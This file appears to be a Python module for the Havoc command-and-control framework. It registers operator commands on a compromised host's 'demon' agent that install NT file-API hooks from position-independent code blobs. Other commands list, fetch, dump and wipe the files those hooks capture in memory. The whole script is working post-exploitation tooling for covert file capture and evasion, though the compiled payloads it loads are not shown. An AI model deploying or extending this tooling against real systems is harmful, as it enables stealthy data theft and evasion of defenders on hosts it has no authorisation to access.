from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

def MemList(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    demon = Demon(demon_id)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon list memFiles")
    demon.InlineExecute(task_id, "go", "./bin/MemList.o", packer.getbuffer(), False)

    return task_id

def MemDumpClean(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    demon = Demon(demon_id)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon dump and clean memFiles")
    demon.InlineExecute(task_id, "go", "./bin/MemDumpClean.o", packer.getbuffer(), False)

    return task_id
def MemClean(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    demon = Demon(demon_id)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon clean memFiles")
    demon.InlineExecute(task_id, "go", "./bin/MemClean.o", packer.getbuffer(), False)

    return task_id
def MemFetch(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    demon = Demon(demon_id)

    if (len(args) != 1):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "wrong parameters!" )
        return False
    if (args[0] == "force"):
        packer.addint(1)
        task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon force Fetch memFiles")
    elif (args[0] == "unforce"):
        packer.addint(0)
        task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon Fetch memFiles")
    else:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "wrong parameters!" )
        return False

    demon.InlineExecute(task_id, "go", "./bin/MemFetch.o", packer.getbuffer(), False)

    return task_id
def InstallHooks(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0
    pic_bof_binary: bytes = b''

    pic_file_paths = [
			"./PIC/Bin/NtCreateFile.x64.bin",
			"./PIC/Bin/NtWriteFile.x64.bin",
			"./PIC/Bin/NtClose.x64.bin",
			"./PIC/Bin/NtQueryVolumeInformationFile.x64.bin",
			"./PIC/Bin/NtQueryInformationFile.x64.bin",
			"./PIC/Bin/NtSetInformationFile.x64.bin",
			"./PIC/Bin/NtReadFile.x64.bin",
			"./PIC/Bin/NtOpenFile.x64.bin",
			"./PIC/Bin/NtFlushBuffersFile.x64.bin"
    ]

    for path in pic_file_paths:
        if exists( path ) is False:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"PIC binary file path not found: {path}")
            return False

    for path in pic_file_paths:
        pic_file_binary = open( path, 'rb' ).read()
        if len(pic_file_binary) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"PIC binary file is empty: {path}" )
            return False
        packer.addstr(pic_file_binary)

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon install NT API HOOK")

    demon.InlineExecute(task_id, "go", "./bin/InstallHooks.o", packer.getbuffer(), False)
    return task_id

# Register the Python function as a command to the Havoc client
RegisterCommand(InstallHooks, "", "meminit", "Install memfiles needed NT API HOOKS", 0, "", "")
RegisterCommand(MemList, "", "memlist", "Show files in memory", 0, "", "")
RegisterCommand(MemFetch, "", "memfetch", "Fetch files in memory", 0, "[force] / [unforce]", "force")
RegisterCommand(MemClean, "", "memclean", "Clean files in memory", 0, "", "")
RegisterCommand(MemDumpClean, "", "memdumpclean", "Dump and Clean files in memory", 0, "", "")
